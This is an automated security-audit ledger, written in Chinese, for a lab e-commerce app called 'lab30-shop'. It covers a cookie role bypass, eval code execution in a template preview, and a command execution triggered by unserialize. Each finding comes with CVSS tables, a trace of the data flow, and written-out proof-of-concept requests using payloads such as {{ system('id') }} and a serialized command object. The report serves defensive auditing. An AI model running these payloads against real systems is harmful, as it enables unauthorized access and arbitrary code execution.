| AV | N | HTTP 入口 | lab30-shop/app/public/ops/users.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需附加 Cookie | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通登录账号 | lab30-shop/app/src/bootstrap.php:33-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同应用内越权 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 泄露全部用户邮箱与角色 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_cookie_role.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<valid_session>; role=admin' -H 'Accept: application/json' http://target/ops/users.php", 'instructions': '普通会员登录取 SHOPSESSID，附加 role=admin 访问 /ops/users.php', 'normal_input': '仅带普通会员 SHOPSESSID', 'attack_input': 'Cookie 增加 role=admin', 'expected_result': '普通会话 403；附加 role=admin 后返回全部用户 JSON 清单'}
````

- 运营端 ops/users.php 信任客户端 Cookie role 造成管理员鉴权绕过与用户清单泄露（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `2f6d447a534147ea808943db9e16a09a` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 2, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 20, 'end_line': 36}]
  结论：ops/users.php 调用 require_user 后，以 $_COOKIE['role'] 覆盖 $u['role']，仅当值等于 admin 时放行；普通登录用户只要发送 role=admin Cookie 即可读取 SELECT id,username,email,role FROM users 的全量结果，并可通过 Accept: application/json 获得 JSON 清单。
  输入：客户端可控 Cookie: role
  传播：users.php:2 $_COOKIE['role'] -> $role -> 与 'admin' 比较 -> 通过后执行 users.php:3 全用户查询 -> users.php:4/5 输出
  危险操作：trusting client cookie for authorization; SELECT 全体用户并输出
  保护：require_user 只校验登录状态与数据库角色，但 users.php:2 在 require_user 之后用 Cookie 覆盖角色；未对 Cookie 做签名或忽略。
  前提：['攻击者拥有任意普通用户登录会话，可设置 Cookie role=admin；无需数据库管理员角色。']
  修复建议：删除对 $_COOKIE['role'] 的信任，仅使用 user() 从数据库会话取得角色；必要时对角色使用 in_array 白名单校验。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:25:37.707955+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 入口为 Web 页面，可远程请求 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需在请求中附加 role=admin Cookie | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求已登录，普通用户即可利用 | lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行构造 Cookie 请求，无需其他用户参与 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一应用授权范围内从普通用户越权到管理员视图 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回全体用户 id、用户名、邮箱、角色 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 该入口仅读取与展示用户清单，未观察到写操作 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未观察到对可用性的破坏 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'ops_users_cookie_role_bypass.sh', 'language': 'bash', 'script': "curl -s -H 'Cookie: SHOPSESSID=<session>; role=admin' -H 'Accept: application/json' 'http://<host>/ops/users.php'", 'instructions': '先以普通用户登录获得 SHOPSESSID，再替换 <session> 和 <host> 后发送请求，观察返回 JSON 用户清单。', 'normal_input': 'Cookie 不含 role=admin', 'attack_input': 'Cookie: role=admin', 'expected_result': '普通用户会话下，普通请求返回 403；附加 role=admin 后返回包含全部 users 的 JSON 列表。'}
````


### 台账 `bfd1580e14754964a21945d15907d435`

- ops/template-render.php 将 {{...}} 表达式无过滤送入 eval 导致任意代码执行（CVSS 3.1 Base 7.2 (high) · CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `4f1c6a43ed5c403387f7dd9a37bccf87` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/template-render.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：ops/template-render.php:2 以 require_user(['operator','admin']) 限制入口，第 3 行 POST 分支先 check_csrf() 再执行 preg_replace_callback('/\{\{(.*?)\}\}/s', ...)，回调内把捕获表达式 $m[1] 直接拼成 eval('return '.$m[1].';')。模板内容完全来自 $_POST['template']，双花括号中的任何 PHP 表达式都会在服务端求值，例如 {{ system('id') }} 或 {{ file_get_contents(...) }}，因此具有运营/管理权限者可在服务端执行任意代码。CSRF 与角色校验只保护入口，未对送入 eval 的内容做白名单或沙箱。
  输入：HTTP POST 'template'
  传播：$_POST['template'] → preg_replace_callback 捕获 {{...}} → $m[1] → eval('return '.$m[1].';')
  危险操作：动态代码执行 eval
  保护：require_user(['operator','admin']) 与 check_csrf() 仅限制调用者与来源，不对表达式内容做任何过滤；参数被拼入 eval
  前提：['攻击者拥有 operator/admin 会话并可获取 csrf token']
  修复建议：移除 eval 表达式求值，改为受限模板语法或对白名单表达式进行解析/替换，禁止任意 PHP 表达式执行。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:21:10.305516+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP POST 远程利用 | lab30-shop/app/public/ops/template-render.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 在双花括号内填入 PHP 表达式即可稳定触发 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | H | 需先以 operator 或 admin 身份登录，且提交合法 CSRF token | lab30-shop/app/public/ops/template-render.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身提交即可触发，无其他用户参与 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一应用进程内执行，不改变授权边界 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | eval 可读取数据库配置、文件与进程内数据 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:4-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行任意 PHP 调用函数修改数据 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 可执行退出/循环等破坏性代码或操作数据库 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'template_render_rce.php', 'language': 'php', 'script': '$ch=curl_init(\'http://target/ops/template-render.php\');curl_setopt_array($ch,[CURLOPT_POST=>1,CURLOPT_COOKIE=>\'SHOPSESSID=<sid>\',CURLOPT_POSTFIELDS=>http_build_query([\'csrf\'=>\'<token>\',\'template\'=>\'{{ system("id") }}\'])]);echo curl_exec($ch);', 'instructions': "以运营账号登录获取 SHOPSESSID，GET /ops/template-render.php 提取 csrf token，然后 POST template={{ system('id') }}。", 'normal_input': 'template=本周精选，共 {{ 2 + 2 }} 款好物', 'attack_input': "template={{ system('id') }}", 'expected_result': '正常模板渲染为 4；攻击模板返回命令输出 (uid/gid)。'}
````

- template-render.php evaluates POST template expressions via eval（CVSS 3.1 Base 8.0 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `aeb058a42d3a492e8e42bbd25f1b0342` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/template-render.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 40, 'end_line': 40}]
  结论：template-render.php:2 reads POST template; line 3 preg_replace_callback matches {{...}} and passes the captured text directly into eval('return '.$m[1].';'). No whitelist/escape exists, so a payload like {{system('id')}} or {{file_get_contents('/etc/passwd')}} executes. Only require_user(['operator','admin']) at line 2 and check_csrf at line 3 gate the sink; any operator account gains arbitrary code execution.
  输入：POST template parameter
  传播：template-render.php:2 $_POST['template'] -> regex capture -> eval string line 3
  危险操作：eval() on attacker-supplied expression
  保护：CSRF token only; no expression validation
  前提：['operator/admin session and CSRF token']
  修复建议：Remove eval; use a restricted expression evaluator or template engine with sandboxing.

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:22:22.215488+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP POST endpoint | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | Simple {{ }} payload | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | Requires operator/admin session plus CSRF token | lab30-shop/app/public/ops/template-render.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | CSRF token needs same-session form | lab30-shop/app/src/bootstrap.php:40-40 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | Execution within app process | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | Arbitrary PHP can read files/env/DB | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | Arbitrary code writes/changes state | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | Code can halt/corrupt service | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'eval_template.php', 'language': 'http', 'script': "POST /ops/template-render.php HTTP/1.1\nHost: target\nCookie: SHOPSESSID=<operator>\nContent-Type: application/x-www-form-urlencoded\n\ncsrf=<token>&template=%7B%7Bsystem('id')%7D%7D", 'instructions': "Log in as operator, fetch csrf from the page, send POST with {{system('id')}}.", 'normal_input': 'template={{ 2 + 2 }}', 'attack_input': "template={{system('id')}}", 'expected_result': 'Control prints 4; attack prints command output.'}
````

- 模板预览将客户端表达式送入 eval 导致代码执行（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `9ed3de243f3942a8a5481171b0a767e2` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/template-render.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：ops/template-render.php:2 读取 POST template，第3行在 POST 且 check_csrf 通过后用 preg_replace_callback 提取 {{...}} 内容并 eval('return '.$m[1].';')。模板表达式完全由客户端控制，operator/admin 已登录用户可注入 PHP 代码执行，CSRF 令牌仅防跨站不防本人滥用权限。
  输入：POST template
  传播：$template=(string)($_POST['template']??'') → preg_replace_callback 匹配 {{...}} → eval('return '.$m[1].';')
  危险操作：第3行 eval 执行客户端表达式
  保护：仅要求登录 operator/admin 与 CSRF 令牌，模板本身无白名单或沙箱
  前提：['攻击者持有 operator 或 admin 会话及有效 CSRF 令牌']
  修复建议：移除 eval，改用受控表达式解析器或预定义占位符替换白名单。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:23:33.024626+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP POST 远程可达 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需提交含 {{...}} 的模板 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 已登录会话 | lab30-shop/app/public/ops/template-render.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身提交 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一进程执行 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可执行任意 PHP 读取数据 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行任意写操作 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意代码可破坏服务 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'template_eval_poc.txt', 'language': 'text', 'script': 'POST /ops/template-render.php\ncsrf=<valid-token>\ntemplate={{ phpinfo() }}', 'instructions': '以 operator 登录获取 csrf_token 与 Cookie，提交 template={{ phpinfo() }}，观察 <pre> 中输出 phpinfo 内容。', 'normal_input': 'template=本周精选，共 {{ 2 + 2 }} 款好物', 'attack_input': 'template={{ phpinfo() }}', 'expected_result': '正常输入显示 4；攻击输入执行 phpinfo 并输出环境信息。'}
````

- ops/template-render.php 将客户端模板表达式送入 eval 导致代码执行（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `baa5ddebd0284b09ab62c33cb034d16b` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/template-render.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 40, 'end_line': 40}]
  结论：template-render.php 对 operator/admin 开放，POST template 经 preg_replace_callback 提取 {{...}} 内文本并直接 eval('return '.$m[1].';')。运营账号提交 {{system('id')}} 即可执行任意 PHP；check_csrf 只防 CSRF 不限内容。
  输入：POST body: template
  传播：$_POST['template'] -> preg_replace_callback 捕获 $m[1] -> eval('return '.$m[1].';')
  危险操作：eval() 执行客户端表达式
  保护：仅 check_csrf 与角色校验，无白名单或沙箱
  前提：['持有 operator/admin 会话及对应 CSRF token']
  修复建议：禁止 eval，用受限表达式解析器或模板沙箱。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:24:53.419730+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 入口 | lab30-shop/app/public/ops/template-render.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接提交表达式 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 账号 | lab30-shop/app/public/ops/template-render.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一 PHP 进程 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读任意数据 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可写文件/改数据 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 可执行系统操作 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_template_eval.sh', 'language': 'bash', 'script': 'curl -s -b \'SHOPSESSID=<operator_session>\' -d \'csrf=<token>\' --data-urlencode \'template={{system("id")}}\' http://target/ops/template-render.php', 'instructions': "operator 登录取 CSRF token，POST 含 {{system('id')}} 模板", 'normal_input': 'template=本周精选 {{ 2 + 2 }}', 'attack_input': 'template={{system("id")}}', 'expected_result': '正常输出 4；攻击输入在 pre 显示命令结果'}
````

- ops/template-render.php 将客户端双花括号表达式传入 eval 导致代码执行（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `fd159f5754d14a6f8867e151f426e7a3` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/template-render.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：template-render.php 第2行读取 POST template，第3行在 POST 且 CSRF 校验通过后，以 preg_replace_callback 捕获 {{...}} 内容并拼接进 eval('return '.$m[1].';')。攻击者提交 {{ ... }} 即可执行任意 PHP 表达式，随后结果进入页面输出。
  输入：POST 参数 template
  传播：template-render.php:2 $_POST['template'] -> :3 preg_replace_callback 捕获 $m[1] -> eval('return '.$m[1].';')
  危险操作：eval 动态执行客户端可控字符串
  保护：csrf_field/check_csrf 只防止跨站请求，不限制 PHP 表达式内容；require_user(['operator','admin']) 只限制登录角色。
  前提：['攻击者拥有 operator 或 admin 登录会话，并能从页面获取有效 CSRF 令牌。']
  修复建议：不要在模板预览中对客户端内容使用 eval；改用受限的表达式解析器或纯字符串替换，并移除 eval 调用。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:25:37.709136+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 入口为 Web POST，可远程请求 | lab30-shop/app/public/ops/template-render.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需 POST 中携带有效 CSRF 令牌与模板表达式 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求 operator/admin 登录 | lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者使用自身登录会话与页面生成的 CSRF 字段即可 | lab30-shop/app/public/ops/template-render.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一 PHP 进程内执行，未观察到权限边界改变 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | eval 可读取服务端变量、配置及文件 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | eval 可执行任意 PHP 表达式并修改运行时状态 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意代码执行可能终止或破坏进程与服务 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'template_render_eval_poc.sh', 'language': 'bash', 'script': 'curl -s -b \'<SHOPSESSID cookie>\' -d \'csrf=<token>&template={{ system("id") }}\' \'http://<host>/ops/template-render.php\'', 'instructions': '以 operator/admin 登录，获取页面中的 CSRF 令牌，替换 <token>/<SHOPSESSID cookie>/<host> 后发送 POST。', 'normal_input': 'template={{ 2 + 2 }}', 'attack_input': 'template={{ system("id") }}', 'expected_result': '正常输入返回 4；攻击输入执行 system 并在页面/响应中返回命令输出。'}
````


### 台账 `d8dcba4e17d54714a54d3ccfdefa406b`

- ops/jobs.php 对用户提交的 job 参数 unserialize，触发 DispatchJob::__wakeup 的 shell_exec 命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `d29013b2200c4b268a3445ed12af88a4` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/jobs.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：ops/jobs.php 第3行 base64_decode 后直接 unserialize($_POST['job'])，dispatch_job.php:4 的 DispatchJob::__wakeup 执行 echo (string)shell_exec($this->command)。class 在 jobs.php:2 已 require，因此攻击者提交构造的序列化对象即触发任意命令执行，仅受 operator/admin 角色限制，且命令输出写入 jobs 表可见。
  输入：POST 参数 job（base64 编码的序列化对象）
  传播：jobs.php:3 $_POST['job'] → base64_decode → unserialize() → 实例化 DispatchJob → __wakeup → shell_exec($command) → ob_get_clean 存入 $output 并插入 jobs 表
  危险操作：shell_exec($this->command)（dispatch_job.php:4），在 unserialize 反序列化时触发
  保护：需 require_user(['operator','admin']) 与 check_csrf()；unserialize 无 allowed_classes 白名单；命令属性完全由攻击者控制
  前提：['已登录 operator 或 admin 角色，且持有有效 CSRF token']
  修复建议：避免对用户数据 unserialize；改用 JSON。若必须 unserialize，设置 allowed_classes 白名单且移除 __wakeup 中的 shell 调用。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:22:54.052929+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 表单远程提交 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造序列化串即可，无需特殊条件 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 登录权限 | lab30-shop/app/public/ops/jobs.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身提交表单即可，无需他人参与 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 命令以应用进程权限执行，越权在服务端同一授权边界内 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取服务器任意可访问文件/数据（shell 命令） | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行任意系统命令修改数据 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | arbitrary command 可中断服务 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'dispatch_job_poc.php', 'language': 'php', 'script': '<?php\necho base64_encode(\'O:12:"DispatchJob":1:{s:7:"command";s:6:"id >&";}\');', 'instructions': '以 operator 账号登录获取 CSRF token，将脚本生成的 base64 作为 POST job 提交到 /ops/jobs.php。', 'normal_input': 'job=默认 DispatchJob 序列化（printf inventory-ready）', 'attack_input': 'job 为 DispatchJob{command:"id"} 的 base64 序列化串', 'expected_result': '攻击输入使 jobs 表 details / 页面 <pre> 出现命令执行输出，而非默认 inventory-ready'}
````


### 台账 `a403db352e9046b78830de823311d99f`

- ops/jobs.php 用户数据 unserialize 触发 DispatchJob::__wakeup shell_exec 命令执行（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `e885540c362643358fd0c6e8d6f1b072` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/jobs.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 2, 'end_line': 5}]
  结论：ops/jobs.php 第 3 行对 $_POST['job'] 做 base64_decode 后直接 unserialize()，攻击者可用序列化对象设置 DispatchJob::$command；dispatch_job.php 第 4 行 __wakeup 中 echo (string)shell_exec($this->command) 在 unserialize 期间就被调用，从而执行任意系统命令。instanceof 检查在反序列化之后，无法阻止 __wakeup 触发。
  输入：HTTP POST 参数 job（base64 编码的序列化字符串）
  传播：$_POST['job'] -> base64_decode -> unserialize -> DispatchJob::__wakeup -> shell_exec($this->command)
  危险操作：shell_exec 执行攻击者可控命令
  保护：仅有 check_csrf() 与 unserialize 后的 instanceof DispatchJob 判定；__wakeup 在判定前已执行，且无 allowed_classes 限制
  前提：['攻击者需 operator/admin 角色会话及有效 CSRF token；可自建 unserialize 载荷']
  修复建议：禁止对不可信输入 unserialize；改用 JSON 并显式校验字段，不使用会触发 shell_exec 的魔术方法

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:26:08.426549+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP POST 远程触发 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 需构造序列化载荷与 CSRF token | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user(['operator','admin']) 要求运营角色 | lab30-shop/app/public/ops/jobs.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户参与 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 命令在应用进程内执行 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | shell_exec 可读取任意数据 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可写入任意文件/数据 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 可执行破坏命令 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


